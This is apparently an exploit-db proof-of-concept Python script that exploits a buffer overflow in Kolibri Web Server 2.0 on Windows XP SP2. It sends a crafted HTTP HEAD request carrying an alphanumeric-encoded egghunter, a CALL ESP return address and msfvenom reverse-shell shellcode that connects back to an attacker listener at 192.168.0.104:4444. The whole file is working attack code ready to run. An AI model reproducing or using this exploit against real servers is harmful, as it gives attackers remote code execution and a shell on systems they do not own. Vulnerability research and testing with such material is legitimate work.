# Exploit Title: Kolibri Web server v2.0 Buffer Overflow using egghunters with restricted character set
# Date: 1-5-2019
# Exploit Author: buffered4ever
# Vendor Homepage: http://www.senkas.com/kolibri/download.php
# Software Link: https://www.exploit-db.com/apps/4d4e15b98e105facf94e4fd6a1f9eb78-Kolibri-2.0-win.zip
# Version: 2.0
# Tested on: Windows XP SP2

import os
import socket

badchars=("\x00\x0a\x0d\x20\x3f")

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.104 LPORT=4444 -b '\x00\x0a\x0d\x20\x3f' BufferRegister=EDI -f python
buf =  ""
buf += "\x89\xfa\x2b\xc9\xb1\x52\xb8\x27\xfa\xbb\xea\x31\x42"
buf += "\x12\x83\xc2\x04\x03\x65\xf4\x59\x1f\x95\xe0\x1c\xe0"
buf += "\x65\xf1\x40\x68\x80\xc0\x40\x0e\xc1\x73\x71\x44\x87"
buf += "\x7f\xfa\x08\x33\x0b\x8e\x84\x34\xbc\x25\xf3\x7b\x3d"
buf += "\x15\xc7\x1a\xbd\x64\x14\xfc\xfc\xa6\x69\xfd\x39\xda"
buf += "\x80\xaf\x92\x90\x37\x5f\x96\xed\x8b\xd4\xe4\xe0\x8b"
buf += "\x09\xbc\x03\xbd\x9c\xb6\x5d\x1d\x1f\x1a\xd6\x14\x07"
buf += "\x7f\xd3\xef\xbc\x4b\xaf\xf1\x14\x82\x50\x5d\x59\x2a"
buf += "\xa3\x9f\x9e\x8d\x5c\xea\xd6\xed\xe1\xed\x2d\x8f\x3d"
buf += "\x7b\xb5\x37\xb5\xdb\x11\xc9\x1a\xbd\xd2\xc5\xd7\xc9"
buf += "\xbc\xc9\xe6\x1e\xb7\xf6\x63\xa1\x17\x7f\x37\x86\xb3"
buf += "\xdb\xe3\xa7\xe2\x81\x42\xd7\xf4\x69\x3a\x7d\x7f\x87"
buf += "\x2f\x0c\x22\xc0\x9c\x3d\xdc\x10\x8b\x36\xaf\x22\x14"
buf += "\xed\x27\x0f\xdd\x2b\xb0\x70\xf4\x8c\x2e\x8f\xf7\xec"
buf += "\x67\x54\xa3\xbc\x1f\x7d\xcc\x56\xdf\x82\x19\xf8\x8f"
buf += "\x2c\xf2\xb9\x7f\x8d\xa2\x51\x95\x02\x9c\x42\x96\xc8"
buf += "\xb5\xe9\x6d\x9b\x79\x45\x6d\x33\x12\x94\x6d\xd2\xbe"
buf += "\x11\x8b\xbe\x2e\x74\x04\x57\xd6\xdd\xde\xc6\x17\xc8"
buf += "\x9b\xc9\x9c\xff\x5c\x87\x54\x75\x4e\x70\x95\xc0\x2c"
buf += "\xd7\xaa\xfe\x58\xbb\x39\x65\x98\xb2\x21\x32\xcf\x93"
buf += "\x94\x4b\x85\x09\x8e\xe5\xbb\xd3\x56\xcd\x7f\x08\xab"
buf += "\xd0\x7e\xdd\x97\xf6\x90\x1b\x17\xb3\xc4\xf3\x4e\x6d"
buf += "\xb2\xb5\x38\xdf\x6c\x6c\x96\x89\xf8\xe9\xd4\x09\x7e"
buf += "\xf6\x30\xfc\x9e\x47\xed\xb9\xa1\x68\x79\x4e\xda\x94"
buf += "\x19\xb1\x31\x1d\x29\xf8\x1b\x34\xa2\xa5\xce\x04\xaf"
buf += "\x55\x25\x4a\xd6\xd5\xcf\x33\x2d\xc5\xba\x36\x69\x41"
buf += "\x57\x4b\xe2\x24\x57\xf8\x03\x6d"


#7C914393 FFD4 CALL ESP - Windows XP SP2

longjump="\xE9\xF4\xFD\xFF\xFF"

egghunter=("\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x54\x58\x05\x59\x59\x59\x59\x05\x01\x59\x59\x59\x05\x5E\x4D\x4D\x4D\x50\x5C\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x59\x01\x59\x01\x2D\x01\x01\x59\x01\x2D\x31\x16\x4E\x15\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x01\x58\x58\x01\x2D\x01\x01\x58\x01\x2D\x4F\x31\x65\x4D\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x59\x59\x01\x01\x2D\x77\x32\x73\x04\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x58\x01\x58\x58\x2D\x58\x01\x58\x01\x2D\x01\x01\x58\x01\x2D\x01\x01\x01\x01\x2D\x5F\x42\x7F\x73\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x58\x58\x58\x58\x2D\x01\x58\x01\x01\x2D\x6B\x4A\x4C\x32\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x7F\x7E\x31\x59\x2D\x01\x59\x59\x01\x2D\x01\x59\x59\x01\x2D\x7D\x77\x4E\x75\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x59\x59\x59\x59\x2D\x59\x01\x01\x01\x2D\x01\x01\x01\x02\x2D\x3E\x62\x52\x39\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x59\x01\x01\x59\x2D\x59\x01\x01\x59\x2D\x59\x01\x01\x01\x2D\x59\x01\x01\x01\x2D\x36\x79\x31\x4C\x50")

evilcrash = egghunter + "A" * (515-len(egghunter)) + "\x93\x43\x91\x7C" + longjump +"C" * (600-519-len(longjump))



buffer="HEAD /"  + evilcrash + " HTTP/1.1\r\n"
buffer+="Host: 192.168.0.102:8080" + "\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent: Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1" + "\r\n"
buffer+="Content-Length: 1048580\r\n\r\n"
buffer+="w00tw00t"+buf
print "[*] Sending evil HTTP request to Kolibri"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.0.102", 8080))
expl.send(buffer)
expl.close()
